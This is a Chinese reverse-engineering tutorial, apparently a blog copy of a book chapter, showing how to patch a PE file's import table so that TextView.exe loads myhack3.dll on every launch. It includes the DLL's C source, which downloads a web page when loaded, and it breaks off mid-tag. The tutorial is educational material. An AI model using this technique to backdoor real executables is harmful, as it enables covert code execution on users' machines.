    <content type="html"><![CDATA[<p>第25章 通过修改PE加载DLL<br>除了前面讲过的DLL动态注入技术外，还可以采用“手工修改可执行文件”的方式加载用户指定的DLL文件，本章将向各位介绍这种方法。学习这种技术前，首先要掌握有关PE文件格式的知识。</p><p>前面我们学过向“运行中的进程”强制注入指定DLL文件的方法。下面我们将换用另外一种方法，通过“直接修改目标程序的可执行文件”，使其运行时强制加载指定的DLL文件。这种方法只要应用过一次后（不需要另外的注入操作），每当进程开始运行时就会自动加载指定的DLL文件。其实，这是一种破解的方法。</p><h1 id="25-1练习文件"><a href="#25-1练习文件" class="headerlink" title="25.1练习文件"></a>25.1练习文件</h1><p>本节将做个简单练习以帮助大家更好地理解要学习的内容。我们的目标是，直接修改<br>TextView.exe文件，使其在运行时自动加载myhack3.dll文件（这需要各位事先掌握修改PE文件头<br>的相关知识与技术）。</p><h2 id="25-1-1-TextView-exe"><a href="#25-1-1-TextView-exe" class="headerlink" title="25.1.1 TextView.exe"></a>25.1.1 TextView.exe</h2><p>TextView.exe是一个非常简单的文本查看程序，只要用鼠标将要查看的文本文件（myhack3.cpp ）<br>拖动（Drop）到其中，即可通过它查看文本文件的内容，如图25-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221204556042.png" alt="图25-1 TextView.exe运行界面"></p><p>各位可将任意一个文本文件拖入其中测试。接下来，使用010editor工具查看TextView.exe可执行文件的IDT （Import Directory Table,导入目录表）。</p><p>从图25-2中可以看到，TextView.exe中直接导入的DLL文件为KERNEL32.dll、USER32.dll、GDI32.dll、SHELL32.dll。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221204755112.png" alt="图25-2 010editor:TextView.exe的IDT"></p><h2 id="25-1-2-TextView-patched-exe"><a href="#25-1-2-TextView-patched-exe" class="headerlink" title="25.1.2 TextView_patched.exe"></a>25.1.2 TextView_patched.exe</h2><p>TextView_patched.exe是修改TextView.exe文件的IDT后得到的文件，即在IDT中添加了导入myhack3.dll的部分，运行时会自动导入myhack3.dll文件。使用PEView工具查看TextView_patched.exe的IDT，如图25-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221205002403-16454478130581.png" alt="图25-2 010editor:TextView_patched.exe的IDT"></p><p>从图25-3可以看到，IDT中除了原来的4个DLL文件外，还新增了一个myhack3.dll文件。这样，运行TextView_Patched.exe文件时程序就会自动加载myhack3.dll文件。下面运行TextView_Patched.exe看看是否如此。</p><p>运行程序并稍等片刻，指定的index.html文件会被下载到工作目录，同时，文本查看程序会自动将其打开，如图25-4所示（运行程序后会自动加载myhack3.dll,尝试连接Google网站，下载网站的index.html文件，并将其拖放到TextView_Patched.exe程序）。进入工作目录，使用网络浏览器打开下载的index.html文件，如图25-5所示。</p><p>从图25-5中可以看到，下载的的确是谷歌的index.html文件。</p><blockquote><p>系统环境不同（网络、防火墙策略、安全&#x2F;管理程序等），可能导致index.html文件无法下载。若正常运行仍无法成功下载index.html文件，建议更换不同的系统环境再次测试。</p></blockquote><h1 id="25-2源代码-myhack3-cpp"><a href="#25-2源代码-myhack3-cpp" class="headerlink" title="25.2源代码-myhack3.cpp"></a>25.2源代码-myhack3.cpp</h1><p>本节将分析myhack3.dll的源代码（myhack3.cpp ）。</p><blockquote><p>所有源代码均使用 MS Visual C++ 2010 Express Edition 编写而成，在 Windows XP&#x2F;7 32位环境中通过测试。</p></blockquote><h2 id="25-2-1-DIIMain"><a href="#25-2-1-DIIMain" class="headerlink" title="25.2.1 DIIMain()"></a>25.2.1 DIIMain()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;shlobj.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Wininet.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Wininet.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_BUF_SIZE            (4096)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL                 <span class="hljs-string">L&quot;http://www.google.com/index.html&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_INDEX_FILE          <span class="hljs-string">L&quot;index.html</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">DWORD WINAPI ThreadProc(LPVOID lParam)</span></span><br><span class="hljs-string"><span class="hljs-meta">&#123;</span></span><br><span class="hljs-string"><span class="hljs-meta">    TCHAR szPath[MAX_PATH] = &#123;0,&#125;;</span></span><br><span class="hljs-string"><span class="hljs-meta">    TCHAR *p = NULL;</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">    OutputDebugString(L&quot;</span>ThreadProc() start...<span class="hljs-string">&quot;);</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">    GetModuleFileName(NULL, szPath, sizeof(szPath));</span></span><br><span class="hljs-string"><span class="hljs-meta">    </span></span><br><span class="hljs-string"><span class="hljs-meta">    if( p = _tcsrchr(szPath, L&#x27;\\&#x27;) )</span></span><br><span class="hljs-string"><span class="hljs-meta">    &#123;</span></span><br><span class="hljs-string"><span class="hljs-meta">        _tcscpy_s(p+1, wcslen(DEF_INDEX_FILE)+1, DEF_INDEX_FILE);</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">        OutputDebugString(L&quot;</span>DownloadURL()<span class="hljs-string">&quot;);</span></span><br><span class="hljs-string"><span class="hljs-meta">        if( DownloadURL(DEF_URL, szPath) )</span></span><br><span class="hljs-string"><span class="hljs-meta">        &#123;</span></span><br><span class="hljs-string"><span class="hljs-meta">            OutputDebugString(L&quot;</span>DropFlie()<span class="hljs-string">&quot;);</span></span><br><span class="hljs-string"><span class="hljs-meta">            DropFile(szPath);</span></span><br><span class="hljs-string"><span class="hljs-meta">        &#125;</span></span><br><span class="hljs-string"><span class="hljs-meta">    &#125;</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">    OutputDebugString(L&quot;</span>ThreadProc() end...<span class="hljs-string">&quot;);</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">    return 0;</span></span><br><span class="hljs-string"><span class="hljs-meta">&#125;</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="hljs-string"><span class="hljs-meta">&#123;</span></span><br><span class="hljs-string"><span class="hljs-meta">    switch( fdwReason )</span></span><br><span class="hljs-string"><span class="hljs-meta">    &#123;</span></span><br><span class="hljs-string"><span class="hljs-meta">        case DLL_PROCESS_ATTACH : </span></span><br><span class="hljs-string"><span class="hljs-meta">            CloseHandle(CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL));</span></span><br><span class="hljs-string"><span class="hljs-meta">            break;</span></span><br><span class="hljs-string"><span class="hljs-meta">    &#125;</span></span><br><span class="hljs-string"><span class="hljs-meta">   </span></span><br><span class="hljs-string"><span class="hljs-meta">    return TRUE;</span></span><br><span class="hljs-string"><span class="hljs-meta">&#125;</span></span><br></code></pre></td></tr></table></figure><p>DllMain()函数的功能非常简单，创建线程运行指定的线程过程，在线程过程（ThreadProc ）中调用DownloadURL()与DropFile()函数，下载指定的网页并将其拖放到文本查看程序。下面分别详细查看这2个函数。</p><h2 id="25-2-2-DownloadURL"><a href="#25-2-2-DownloadURL" class="headerlink" title="25.2.2 DownloadURL()"></a>25.2.2 DownloadURL()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">DownloadURL</span><span class="hljs-params">(LPCTSTR szURL, LPCTSTR szFile)</span><br>&#123;<br>    BOOL            bRet = FALSE;<br>    HINTERNET    hInternet = <span class="hljs-literal">NULL</span>, hURL = <span class="hljs-literal">NULL</span>;<br>    BYTE            pBuf[DEF_BUF_SIZE] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    DWORD           dwBytesRead = <span class="hljs-number">0</span>;<br>    FILE            *pFile = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span>         err = <span class="hljs-number">0</span>;<br><br>    hInternet = InternetOpen(<span class="hljs-string">L&quot;ReverseCore&quot;</span>, <br>                             INTERNET_OPEN_TYPE_PRECONFIG, <br>                             <span class="hljs-literal">NULL</span>, <br>                             <span class="hljs-literal">NULL</span>, <br>                             <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>( <span class="hljs-literal">NULL</span> == hInternet )<br>    &#123;<br>        OutputDebugString(<span class="hljs-string">L&quot;InternetOpen() failed!&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    hURL = InternetOpenUrl(hInternet,<br>                           szURL,<br>                           <span class="hljs-literal">NULL</span>,<br>                           <span class="hljs-number">0</span>,<br>                           INTERNET_FLAG_RELOAD,<br>                           <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>( <span class="hljs-literal">NULL</span> == hURL )<br>    &#123;<br>        OutputDebugString(<span class="hljs-string">L&quot;InternetOpenUrl() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> _DownloadURL_EXIT;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>( err = _tfopen_s(&amp;pFile, szFile, <span class="hljs-string">L&quot;wt&quot;</span>) )<br>    &#123;<br>        OutputDebugString(<span class="hljs-string">L&quot;fopen() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> _DownloadURL_EXIT;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>( InternetReadFile(hURL, pBuf, DEF_BUF_SIZE, &amp;dwBytesRead) )<br>    &#123;<br>        <span class="hljs-keyword">if</span>( !dwBytesRead )<br>            <span class="hljs-keyword">break</span>;<br><br>        fwrite(pBuf, dwBytesRead, <span class="hljs-number">1</span>, pFile);<br>    &#125;<br><br>    bRet = TRUE;<br><br>_DownloadURL_EXIT:<br>    <span class="hljs-keyword">if</span>( pFile )<br>        fclose(pFile);<br><br>    <span class="hljs-keyword">if</span>( hURL )<br>        InternetCloseHandle(hURL);<br><br>    <span class="hljs-keyword">if</span>( hInternet )<br>        InternetCloseHandle(hInternet);<br><br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p>DownloadURL()函数会下载参数szURL中指定的网页文件，并将其保存到szFile目录。示例中，该函数用来连接谷歌网站（<a href="http://www.google.com),并下载网站的index.html文件./">www.google.com），并下载网站的index.html文件。</a></p><blockquote><p>实际上，上述示例中的 DownloadURL()函数是使用 IntemetOpen()、IntemetOpenUrl()、<br>IntemetReadFile() API 对 URLDownloadToFile() API 的简单实现。IntemetOpen()、<br>IntemetOpenUrl()、IntemetReadFile() API 均在 wininet.dll 中提供，而 URLDownloadToFile()<br>API 在 urlmon.dll 中提供。</p></blockquote><h2 id="25-2-3-DropFile"><a href="#25-2-3-DropFile" class="headerlink" title="25.2.3 DropFile()"></a>25.2.3 DropFile()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">DropFile</span><span class="hljs-params">(LPCTSTR wcsFile)</span><br>&#123;<br>    HWND            hWnd = <span class="hljs-literal">NULL</span>;<br>    DWORD           dwBufSize = <span class="hljs-number">0</span>;<br>    BYTE            *pBuf = <span class="hljs-literal">NULL</span>; <br>DROPFILES*pDrop = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span>            szFile[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    HANDLE          hMem = <span class="hljs-number">0</span>;<br><br>    WideCharToMultiByte(CP_ACP, <span class="hljs-number">0</span>, wcsFile, <span class="hljs-number">-1</span>,<br>                        szFile, MAX_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    dwBufSize = <span class="hljs-keyword">sizeof</span>(DROPFILES) + <span class="hljs-built_in">strlen</span>(szFile) + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-keyword">if</span>( !(hMem = GlobalAlloc(GMEM_ZEROINIT, dwBufSize)) )<br>    &#123;<br>        OutputDebugString(<span class="hljs-string">L&quot;GlobalAlloc() failed!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    pBuf = (LPBYTE)GlobalLock(hMem);<br><br>    pDrop = (DROPFILES*)pBuf; <br>    pDrop-&gt;pFiles = <span class="hljs-keyword">sizeof</span>(DROPFILES);<br>    strcpy_s((<span class="hljs-type">char</span>*)(pBuf + <span class="hljs-keyword">sizeof</span>(DROPFILES)), <span class="hljs-built_in">strlen</span>(szFile)+<span class="hljs-number">1</span>, szFile);<br><br>    GlobalUnlock(hMem);<br><br>    <span class="hljs-keyword">if</span>( !(hWnd = GetWindowHandleFromPID(GetCurrentProcessId())) )<br>    &#123;<br>        OutputDebugString(<span class="hljs-string">L&quot;GetWndHandleFromPID() failed!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    PostMessage(hWnd, WM_DROPFILES, (WPARAM)pBuf, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>DropFile()函数将下载的index.html文件拖放到TextView_Patch.exe进程并显示其内容。为此，需要先获取TextView_Patch.exe进程的主窗口句柄，再传送WM_DROPFILES消息。总之，DropFile()函数的主要功能是，使用PID获取窗口句柄，再调用postMessage（WM_DROPFILES）API将消息放入消息队列（此处省略有关API的详细说明）。</p><h2 id="25-2-4-dummy"><a href="#25-2-4-dummy" class="headerlink" title="25.2.4 dummy()"></a>25.2.4 dummy()</h2><p>在myhack3.cpp源代码中还要注意dummy()这个函数。</p><p>dummy()函数是myhack3.dll文件向外部提供服务的导岀函数，但正如所见，它没有任何功能。既然如此，为何还要将其导出呢？这是为了保持形式上的完整性，使myhack3.dll能够顺利添加到TextView.exe文件的导入表。 </p><p>在PE文件中导入某个DLL,实质就是在文件代码内调用该DLL提供的导出函数。PE文件头中记录着DLL名称、函数名称等信息。因此，myhack3.dll至少要向外提供1个以上的导出函数才能保持形式上的完整性。</p><p>一般而言，向导入表中添加DLL是由程序的构建工具（VC++、VB、Delphi等）完成的，但下面我们将直接使用PE Viewer与Hex Editor两个工具修改TextView.exe的导入表，以便更好地学习代码逆向分析知识。</p><h1 id="25-3修改TextView-exe文件的准备工作"><a href="#25-3修改TextView-exe文件的准备工作" class="headerlink" title="25.3修改TextView.exe文件的准备工作"></a>25.3修改TextView.exe文件的准备工作</h1><h2 id="25-3-1-修改思路"><a href="#25-3-1-修改思路" class="headerlink" title="25.3.1 修改思路"></a>25.3.1 修改思路</h2><p>如前所见，PE文件中导入的DLL信息以结构体列表形式存储在IDT中。只要将myhack3.dll添加到列表尾部就可以了。当然，此前要确认一下IDT中有无足够空间。</p><h2 id="25-3-2查看IDT是否有足够空间"><a href="#25-3-2查看IDT是否有足够空间" class="headerlink" title="25.3.2查看IDT是否有足够空间"></a>25.3.2查看IDT是否有足够空间</h2><p>首先，使用PEView查看TextView.exe的IDT地址（PE文件头的IMAGE_OPTIONAL_HEADER<br>结构体中导入表RVA值即为IDT的RVA ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221211520952.png" alt="图25-6 IDT的RVA值"></p><p>从图25-6可知，IDT的地址（RVA ）为84CC，文件偏移为76CC。</p><p>IDT的文件偏移为76CC~772F，整个大小为64字节，共有5个IID结构体，其中最后一个为NULL结构体。从图中可以看出IDT尾部存在其他数据，没有足够空间来添加myhack3.dll的IID结构体。</p><h2 id="25-3-3移动-IDT"><a href="#25-3-3移动-IDT" class="headerlink" title="25.3.3移动 IDT"></a>25.3.3移动 IDT</h2><p>在这种情形下，我们要先把整个IDT转移到其他更广阔的位置，然后再添加新的IID。确定移<br>动的目标位置时，可以使用下面三种方式： </p><p>□查找文件中的空白区域； </p><p>□增加文件最后一个节区的大小； </p><p>□在文件末尾添加新节区。</p><p>首先尝试第一种方法，即查找文件中的空白区域（程序运行时未使用的区域）。正如在图25-10中看到的一样，.rdata节区尾部恰好存在大片空白区域（一般说来，节区或文件末尾都存在空白区域，PE文件中这种空白区域称为Null-Padding区域）。</p><p>接下来，把原IDT移动到该Null-Padding区域（RVA: 8C60<del>8DFF ）中合适位置就行了。在此之前，先要确认一下该区域（RVA: 8C60</del>8DFF）是否全是空白可用区域（Null-Padding区域）。请注意，并不是文件中的所有区域都会被无条件加载到进程的虚拟内存，只有节区头中明确记录的区域才会被加载。使用010Editor工具查看TextView.exe文件的.rdata节区头，如图25-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212100331.png" alt="图25-11 TextView.exe文件的.rdata节区头"></p><p>从节区头中信息可以看岀，.rdata节区在磁盘文件与内存中的大小是不同的。 .rdata节区在磁盘文件中的大小为2E00,而文件执行后被加载到内存时，程序实际使用的数据大小（映射大小）仅为2C56,剩余未被使用的区域大小为1AA （2E00-2C56）。在这段空白区域创建IDT是不会有什么问题的。</p><blockquote><p>PE文件尾部有些部分填充着NULL,但这并不意味着这些部分一定就是Null-Padding区域（空白可用区域）。这些区域也有可能是程序使用的区域，且并非所有Null-Padding区域都会加载到内存。只有分析节区头信息后才能判断。如果示例中TextView.exe的Null-Padding区域很小，无法容纳IDT，那么就要增加最后节区的尺寸或添加新节区，以保证有足够空间存放IDT。</p></blockquote><p>由于图25-10中的Null-Padding区域可以使用，接下来，我们要在RVA: 8C80 （ RAW: 7E80 ）位置创建IDT （请记住这个位置）</p><h1 id="25-4-修改-TextView-exe"><a href="#25-4-修改-TextView-exe" class="headerlink" title="25.4 修改 TextView.exe"></a>25.4 修改 TextView.exe</h1><p>先把TextView.exe复制到工作文件夹，重命名为TextView_Patch.exe。下面使用TextView_Patch.exe文件练习打补丁。基本的操作步骤是：先使用PEView打开TextView.exe原文件，查看各种PE信息，然后使用HxD打开TextView_Patch.exe文件进行修改。</p><h2 id="25-4-1-修改导入表的RVA值"><a href="#25-4-1-修改导入表的RVA值" class="headerlink" title="25.4.1 修改导入表的RVA值"></a>25.4.1 修改导入表的RVA值</h2><p>IMAGE_OPTIONAL_HEADER的导入表结构体成员用来指出IDT的位置（RVA ）与大小，如 图25-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212345652.png" alt="图25-12 IMAGE_0PTI0NAL_HEADER的IMPORT Table RVA/Size"></p><p>TextView.exe文件中，导入表的RVA值为84CC。接下来，将导入表的RVA值更改为新IDT的RVA值8C80,在Size原值64字节的基础上加14个字节（IID结构体的大小），修改为78字节（参考图25-13 ）。</p><h2 id="25-4-2-删除绑定导入表"><a href="#25-4-2-删除绑定导入表" class="headerlink" title="25.4.2 删除绑定导入表"></a>25.4.2 删除绑定导入表</h2><p>BOUND IMPORT TABLE （绑定导入表）是一种提高DLL加载速度的技术，如图25-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212449982.png" alt="图25-14 IMAGE_OPTIONAL_HEADER的BOUND IMPORT TABLE RVA/Size"></p><p>若想正常导入myhack3.dll，需要向绑定导入表添加信息。但幸运的是，该绑定导入表是个可选项，不是必须存在的，所以可删除（修改其值为0即可）以获取更大便利。当然，绑定导入表完全不存在也没关系，但若存在，且其内信息记录错误，则会在程序运行时引发错误。本示例TextView.exe文件中，绑定导入表各项的值均为0,不需要再修改。修改其他文件时，一定要注意检查绑定导入表中的数据。</p><h2 id="25-4-3-创建新IDT"><a href="#25-4-3-创建新IDT" class="headerlink" title="25.4.3 创建新IDT"></a>25.4.3 创建新IDT</h2><p>先使用Hex Editor完全复制原IDT （ RAW: 76CC~772F ），然后覆写（Paste write）到IDT的新<br>位置（RAW: 7E80 ），如图25-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212616173.png" alt="图25-15 HxD: TextView_Patch.exe的新IDT"></p><p>然后在新IDT尾部（RAW: 7ED0）添加与myhack3.dll对应的IID （后面会单独讲解各成员的数据）：</p><p>在准确位置（RAW:7ED0）写入相关数据，如图25-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212702043.png" alt="图25-16 HxD：为myhack3.dll添加IMAGE_IMPORT_DESCRIPTOR结构体数据"></p><h2 id="25-4-4-设置-Name、INT、IAT"><a href="#25-4-4-设置-Name、INT、IAT" class="headerlink" title="25.4.4 设置 Name、INT、IAT"></a>25.4.4 设置 Name、INT、IAT</h2><p>前面添加的IID结构体成员拥有指向其他数据结构（INT、Name、IAT）的RVA值。因此，必须准确设置这些数据结构才能保证TextView_Patch.exe文件正常运行。由前面设置可知INT、Name、IAT的RVA&#x2F;RAW的值，整理如表25-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212824635.png" alt="表25-2 INT、Name、IAT"></p><blockquote><p>RVA与RAW （文件偏移）间的转换可以借助PEView。但是建议各位掌握它们之间的转换方法，亲自计算（请参考第13章）。</p></blockquote><p>这些地址（RVA: 8D00, 8D10，8D20）就位于新创建的IDT （ RVA: 8C80 ）下方。我为了操作方便才选定该区域，各位选择其他位置也没关系。在HxD编辑器中转到7F00地址处，输入相应值，如图25-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212909922.png" alt="图25-17 HxD:myhack3.dll的INT、Name、IAT"></p><p>为了更好地理解以上内容，使用PEView打开TextView_Patch.exe文件查看同一区域，查看时使用RVA视图方式，如图25-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC25%E7%AB%A0%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9PE%E5%8A%A0%E8%BD%BDDLL.assets/image-20220221212929354.png" alt="图25-18 PEView: myhack3.dll的INT、Name、IAT"></p><p>下面讲解图25-18中显示的各值意义。 </p><p>8CD0地址处存在着myhack3.dll的IID结构体，其中3个主要成员（RVA of INT、RVA of Name,RVA of IAT）的值分别是实际INT、Name、IAT的指针。</p><p>简单地说，INT （ Import Name Table,导入名称表）是RVA数组，数组的各个元素都是一个RVA地址，该地址由导入函数的Ordinal （ 2个字节）+Func Name String结构体构成，数组的末尾为NULL。上图中INT有1个元素，其值为8D30,该地址处是要导入的函数的Ordinal （2个字节）与函数的名称字符串（“dummy”）。</p><p>Name是包含导入函数的DLL文件名称字符串，在8D10地址处可以看到“myhack3.dll”字符串。</p><p>IAT也是RVA数组，各元素既可以拥有与INT相同的值，也可以拥有其他不同值（若INT中数据准确，IAT也可拥有其他不同值）。反正实际运行时，PE装载器会将虚拟内存中的IAT替换为实际函数的地址。</p><blockquote><p>.INT的各元素其实是1个IMAGE_IMPORT_BY_NAME结构体的指针（RVA ），IMAGE_IMPORT_BY_NAME结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span> <br>    WORD Hint; <br>    BYTE Name[<span class="hljs-number">1</span>]; <br>&#125; IMAGE_IMPORT_BY_NAME;<br></code></pre></td></tr></table></figure></blockquote><h2 id="25-4-5-修改IAT节区的属性值"><a href="#25-4-5-修改IAT节区的属性值" class="headerlink" title="25.4.5 修改IAT节区的属性值"></a>25.4.5 修改IAT节区的属性值</h2><p>加载PE文件到内存时，PE装载器会修改IAT，写入函数的实际地址，所以相关节区一定要拥有WRITE （可写）属性。只有这样，PE装载器才能正常进行写入操作。使用010Editor查看.rdata节区头，如图25-19所示。</p><p><img 